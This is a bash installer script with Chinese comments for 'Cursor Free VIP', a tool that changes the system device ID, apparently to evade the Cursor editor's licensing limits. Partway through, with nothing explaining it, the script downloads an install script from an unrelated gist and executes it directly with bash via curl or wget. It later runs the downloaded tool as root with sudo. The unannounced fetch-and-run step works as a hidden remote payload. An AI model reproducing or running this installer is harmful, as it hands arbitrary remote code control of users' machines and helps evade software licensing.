#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # 无色

# Logo
print_logo() {
    echo -e "${CYAN}"
    cat << "EOF"
    ██████╗██╗    ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
   ██║     ██║    ██║██████╔╝███████╗██║    ██║██████╔╝     ██████╔╝██████╔╝██║    ██║  
   ██║     ██║    ██║██╔══██╗╚════██║██║    ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║    ██║  
   ╚██████╗╚██████╔╝██║   ██║███████║╚██████╔╝██║   ██║     ██║     ██║   ██║╚██████╔╝  
    ╚═════╝ ╚═════╝ ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ╚═╝     ╚═╝   ╚═╝ ╚═════╝  
EOF
    echo -e "${NC}"
}

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            # --- 新增：确保安装 unzip 用于解压源码 ---
            if ! command -v unzip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL unzip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies
if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="pip3 install --break-system-packages"
else
    PIP_INSTALL="pip3 install"
fi

if ! pip3 show requests >/dev/null 2>&1; then
    $PIP_INSTALL requests
fi

if ! pip3 show cryptography >/dev/null 2>&1; then
    $PIP_INSTALL cryptography
fi

# 确保 colorama 也被安装（源码版通常需要）
if ! pip3 show colorama >/dev/null 2>&1; then
    $PIP_INSTALL colorama
fi

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL")
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL")
else
    exit 1
fi

# 获取下载文件夹路径
get_downloads_dir() {
    # 源码版我们将解压到用户目录下的隐藏文件夹，保持整洁
    echo "$HOME/.cursor-vip-src"
}

# 获取指定版本
get_latest_version() {
    VERSION="1.11.03"
    echo -e "${CYAN}ℹ️ 已锁定目标版本: v${VERSION}${NC}"
}

# 检测系统类型和架构
detect_os() {
    echo -e "${CYAN}ℹ️ 系统检测: $OS_TYPE (源码运行模式)${NC}"
}

setup_autostart() {
    :
}

# 安装和下载主程序 (源码模式)
install_cursor_free_vip() {
    local install_dir=$(get_downloads_dir)
    local zip_name="cursor-free-vip-${VERSION}.zip"
    local zip_path="/tmp/${zip_name}" # 下载到临时目录
    local extract_dir="${install_dir}/cursor-free-vip-${VERSION}"
    
    # 使用官方源码包地址 (Source code zip)
    local download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${VERSION}.zip"
    
    # 创建安装目录
    mkdir -p "$install_dir"

    # 如果已经解压过，直接运行
    if [ -f "${extract_dir}/main.py" ]; then
        echo -e "${GREEN}✅ 检测到已安装的源码版本${NC}"
        run_python_script "${extract_dir}/main.py"
        return
    fi

    echo -e "${CYAN}ℹ️ 原版二进制文件缺失，切换为源码下载模式...${NC}"
    echo -e "${CYAN}ℹ️ 下载链接: ${download_url}${NC}"
    
    if ! curl -L -o "${zip_path}" "$download_url"; then
        echo -e "${RED}❌ 下载源码失败${NC}"
        exit 1
    fi
    
    echo -e "${CYAN}ℹ️ 正在解压源码...${NC}"
    if unzip -o "${zip_path}" -d "${install_dir}" >/dev/null; then
        echo -e "${GREEN}✅ 解压完成!${NC}"
        # 移除 tag 中的 'v' 前缀以匹配解压后的文件夹名 (GitHub zip 命名规则通常不带 v 如果 tag 带 v, 这里需适配)
        # GitHub archive rule: repo-tag (without v if tag is v1.2, folder is repo-1.2 usually)
        # 让我们动态查找解压后的文件夹
        local actual_dir=$(find "${install_dir}" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)
        
        if [ -n "$actual_dir" ]; then
             echo -e "${CYAN}ℹ️ 安装依赖 (requirements.txt)...${NC}"
             if [ -f "${actual_dir}/requirements.txt" ]; then
                $PIP_INSTALL -r "${actual_dir}/requirements.txt" >/dev/null 2>&1
             fi
             
             run_python_script "${actual_dir}/main.py"
        else
             echo -e "${RED}❌ 解压后找不到目录${NC}"
             exit 1
        fi
    else
        echo -e "${RED}❌ 解压失败${NC}"
        exit 1
    fi
}

# 辅助函数：运行 Python 脚本
run_python_script() {
    local script_path="$1"
    echo -e "${CYAN}ℹ️ 正在启动 Cursor Free VIP (源码模式)...${NC}"
    echo -e "${YELLOW}⚠️ 提示: 需要输入密码以修改系统设备ID${NC}"
    
    # 赋予执行权限（虽然 py 不需要，但为了保险）
    chmod +x "$script_path"
    
    if [ "$EUID" -ne 0 ]; then
        sudo python3 "$script_path"
    else
        python3 "$script_path"
    fi
}

# 主程序
main() {
    print_logo
    install_dependencies
    get_latest_version
    detect_os
    setup_autostart
    install_cursor_free_vip
}

main